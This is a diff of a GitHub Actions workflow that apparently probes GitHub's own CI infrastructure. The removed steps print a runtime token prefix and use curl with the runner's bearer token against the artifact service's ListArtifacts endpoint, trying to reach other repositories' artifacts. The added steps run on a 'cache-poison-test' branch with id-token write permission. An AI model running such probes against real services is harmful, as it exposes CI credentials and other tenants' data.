@@ -1,48 +1,18 @@
 name: artifact-upload-probe
-on: workflow_dispatch
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main, cache-poison-test]
+
+permissions:
+  id-token: write
+  contents: read
+
 jobs:
-  upload:
+  probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repo (needed for local action)
-        uses: actions/checkout@v4
-
-      - name: Run privileged probe action (proper node action env)
-        id: probe
-        uses: ./probe-action
-
-      - name: Show outputs from probe action
-        run: |
-          echo "=== Results from privileged node action ==="
-          echo "RESULTS_URL: ${{ steps.probe.outputs.RESULTS_URL }}"
-          echo "CACHE_URL: ${{ steps.probe.outputs.CACHE_URL }}"
-          echo "TOKEN_PRESENT: ${{ steps.probe.outputs.TOKEN_PRESENT }}"
-          echo "TOKEN_PREFIX: ${{ steps.probe.outputs.TOKEN_PREFIX }}"
-          
-      - name: If token present, probe artifact service for cross-repo listing
-        run: |
-          RESULTS_URL="${{ steps.probe.outputs.RESULTS_URL }}"
-          TOKEN_PREFIX="${{ steps.probe.outputs.TOKEN_PREFIX }}"
-          
-          if [ -n "$RESULTS_URL" ]; then
-            echo "=== RESULTS_URL found: $RESULTS_URL ==="
-            echo "=== Probing ListArtifacts without repo scope ==="
-            # Try to list artifacts - if not repo-scoped, this could return other repos' artifacts
-            curl -s -X POST \
-              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-              -H "Content-Type: application/json" \
-              "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-              -d '{}' -w "\nHTTP: %{http_code}" | tail -20
-          else
-            echo "RESULTS_URL was not found in node action env - testing ORCHESTRATION_ID path"
-            # Try using orchestration ID from env
-            echo "ACTIONS_ORCHESTRATION_ID: $ACTIONS_ORCHESTRATION_ID"
-            ORG_ID=$(echo "$ACTIONS_ORCHESTRATION_ID" | cut -d'.' -f1)
-            echo "Extracted UUID: $ORG_ID"
-            # Probe results-receiver with orchestration ID
-            curl -s -X POST \
-              -H "Content-Type: application/json" \
-              "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
-              -d "{\"workflowRunId\":\"$ORG_ID\"}" \
-              -w "\nHTTP: %{http_code}" | tail -10
-          fi
+      - uses: actions/checkout@v4
+      - name: Run probe
+        run: node probe-action/index.js
